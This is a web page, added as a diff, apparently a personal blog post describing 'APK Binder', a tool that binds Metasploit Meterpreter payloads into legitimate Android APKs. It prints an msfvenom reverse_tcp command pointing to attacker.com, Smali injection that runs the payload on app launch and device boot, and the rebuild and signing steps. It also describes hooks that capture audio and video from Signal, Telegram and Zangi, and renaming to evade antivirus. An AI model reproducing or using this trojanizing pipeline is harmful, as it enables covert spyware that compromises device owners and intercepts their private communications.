@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>APK Binder: Android Binary Instrumentation — Prashant Deshmukh</title>
+<meta name="description" content="Technical deep dive into APK Binder by Prashant Deshmukh. DEX injection, Smali patching, Metasploit integration, and antivirus evasion.">
+<meta name="keywords" content="APK binder, android binary instrumentation, dex injection, smali patching, metasploit android, sivedcodes">
+<link rel="canonical" href="https://sivedcodes.github.io/blog/apk-binder-android-binary-instrumentation.html">
+<link rel="stylesheet" href="/assets/style.css">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"TechArticle","headline":"APK Binder: Professional Android Binary Instrumentation Framework","author":{"@type":"Person","name":"Prashant Deshmukh"},"datePublished":"2026-06-02","proficiencyLevel":"Expert"}
+</script>
+</head>
+<body>
+<div class="container">
+  <nav class="nav">
+    <a href="/" class="nav-logo">sivedcodes</a>
+    <div class="nav-links"><a href="/">Home</a><a href="/blog/">Blog</a><a href="https://github.com/sivedcodes">GitHub</a></div>
+  </nav>
+
+  <article>
+    <div class="article-header">
+      <div class="date">Jun 2, 2026 · 8 min read · By <strong>Prashant Deshmukh</strong></div>
+      <h1>APK Binder: Professional Android Binary Instrumentation Framework</h1>
+      <div class="tags"><span class="tag">Security</span><span class="tag">Android</span><span class="tag">Smali</span><span class="tag">Metasploit</span><span class="tag">APKTool</span></div>
+    </div>
+
+    <div class="article-body">
+      <p><strong>APK Binder</strong> is a professional-grade Android binary instrumentation suite that automates DEX bytecode injection and payload binding. Built during my research at <strong>V-Patrol AI</strong>, it transforms standard APKs into persistent, stealthy tools by combining low-level Smali patching with a robust, AAPT2-compliant build pipeline.</p>
+
+      <h2>Architecture</h2>
+      <p>The framework operates in 4 phases:</p>
+      <pre><code>Input APK → Decompile (APKTool) → Inject Smali → Recompile + Sign → Output APK
+                                        ↓
+                              Metasploit / Custom Payload</code></pre>
+
+      <h2>Key Features</h2>
+
+      <h3>1. Metasploit Payload Integration</h3>
+      <p>Automated generation of <strong>Meterpreter reverse_tcp</strong> payloads using <code>msfvenom</code>, with a grafting system that merges Smali code into the target APK using Multi-Dex (<code>smali_classesN</code>) to avoid the <strong>64K method limit</strong>.</p>
+      <pre><code>msfvenom -p android/meterpreter/reverse_tcp \
+  LHOST=attacker.com LPORT=4444 -o payload.apk
+apktool d target.apk -o target_dir
+# Graft payload Smali into smali_classes3/</code></pre>
+
+      <h3>2. Custom Smali Injection</h3>
+      <p>Automatic injection into <code>onCreate</code> methods and <code>BroadcastReceiver</code>s to ensure payload execution on app launch and device boot.</p>
+      <pre><code>invoke-static {p0}, Lcom/payload/Payload;->start(Landroid/content/Context;)V</code></pre>
+
+      <h3>3. Media Data Interception</h3>
+      <p>Specialized hooks for apps like <strong>Signal, Telegram, Zangi</strong> to capture raw audio/video data by modifying WebRTC and media classes (<code>AudioRecord</code>, <code>TextureView</code>).</p>
+
+      <h3>4. Antivirus Evasion</h3>
+      <p>Global package renaming and class-path obfuscation to evade static analysis and mobile antivirus scanners.</p>
+
+      <h3>5. Automated Build Pipeline</h3>
+      <pre><code>apktool b target_dir -o unsigned.apk
+zipalign -f 4 unsigned.apk aligned.apk
+apksigner sign --ks my.keystore \
+  --ks-pass pass:android aligned.apk</code></pre>
+
+      <h2>Challenges Solved</h2>
+      <table>
+        <tr><th>Challenge</th><th>Solution</th></tr>
+        <tr><td>"App not installed" error</td><td>Removed Split-APK tags & Network Security Config</td></tr>
+        <tr><td>Resource filename errors</td><td>Script to find/replace illegal characters ($) in XML/Smali</td></tr>
+        <tr><td>64K method limit</td><td>Auto-routing payload to highest smali_classesN</td></tr>
+        <tr><td>Detection by antivirus</td><td>Global package rename + obfuscation</td></tr>
+        <tr><td>Certificate issues</td><td>Automated JKS generation via OpenSSL</td></tr>
+      </table>
+
+      <h2>Use Cases</h2>
+      <ul>
+        <li><strong>Penetration Testing</strong> — Deploy Metasploit agents via innocuous-looking apps</li>
+        <li><strong>Security Research</strong> — Study how malware binds payloads to legitimate APKs</li>
+        <li><strong>CTF Challenges</strong> — Quickly instrument APKs for capture-the-flag competitions</li>
+        <li><strong>Antivirus Testing</strong> — Validate detection capabilities of mobile security solutions</li>
+      </ul>
+
+      <div class="article-author">
+        <strong>Prashant Deshmukh (sivedcodes)</strong>
+        <div style="color:var(--text-muted);font-size:.85em">Lead Malware Analyst & Developer at V-Patrol AI</div>
+        <div class="links">
+          <a href="https://linkedin.com/in/sivedcodes">LinkedIn</a>
+          <a href="https://github.com/sivedcodes">GitHub</a>
+          <a href="https://prashant-deshmukh.web.app">Portfolio</a>
+        </div>
+      </div>
+    </div>
+  </article>
+
+  <div class="footer">
+    <p>© 2026 <strong>Prashant Deshmukh</strong> · <a href="/blog/">All Articles</a></p>
+  </div>
+</div>
+</body>
+</html>
